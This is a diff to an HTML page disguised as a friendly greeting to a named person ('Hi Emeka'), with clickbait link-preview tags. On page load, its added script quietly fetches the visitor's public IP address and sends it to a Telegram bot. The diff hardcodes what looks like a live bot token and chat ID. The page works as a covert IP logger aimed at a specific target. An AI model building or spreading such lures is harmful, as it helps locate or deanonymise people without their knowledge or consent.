@@ -6,8 +6,6 @@
   <meta property="og:description" content="You won't believe this...">
   <meta property="og:image" content="clickhere.jpg">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://yourdomain.com">
-
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Hi</title>
   <style>
@@ -30,26 +28,27 @@
   </style>
 </head>
 <body>
-  <img src="me.png" alt="Me">
-  <div class="message">Hi 👋🏿</div>
+  <div class="message">Hi Emeka 👋🏿</div>
+<script>
+  const PUBLIC_BOT_TOKEN = '7904257718:AAEMNe8Nb4Lk4YcCPr1BjB2bfxq9HF-tjI8';
+  const PUBLIC_CHAT_ID = '7830815090';
 
-  <script>
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        const ip = data.ip;
-        const message = `New visitor IP: ${ip}`;
-        fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: 'YOUR_CHAT_ID',
-            text: message
-          })
-        });
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const ip = data.ip;
+      const message = `New visitor IP: ${ip}`;
+      fetch(`https://api.telegram.org/bot${PUBLIC_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: PUBLIC_CHAT_ID,
+          text: message
+        })
       });
-  </script>
+    });
+</script>
 </body>
 </html>
